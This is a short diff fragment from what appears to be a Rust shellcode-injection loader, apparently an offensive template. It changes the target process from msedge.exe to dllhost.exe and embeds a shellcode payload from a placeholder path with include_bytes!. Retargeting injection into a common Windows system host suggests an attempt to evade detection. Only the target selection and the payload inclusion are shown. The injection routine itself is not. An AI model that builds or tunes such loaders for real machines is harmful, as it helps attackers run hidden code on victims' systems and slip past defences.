@@ -141,7 +141,7 @@ fn enhance(mut buf: Vec<u8>, tar:usize) {
 
 fn main() {
     // inject in the following processes:
-    let tar: &str = "msedge.exe";
+    let tar: &str = "dllhost.exe";
 
     let buf = include_bytes!({{PATH_TO_SHELLCODE}});
     let mut vec: Vec<u8> = Vec::new();
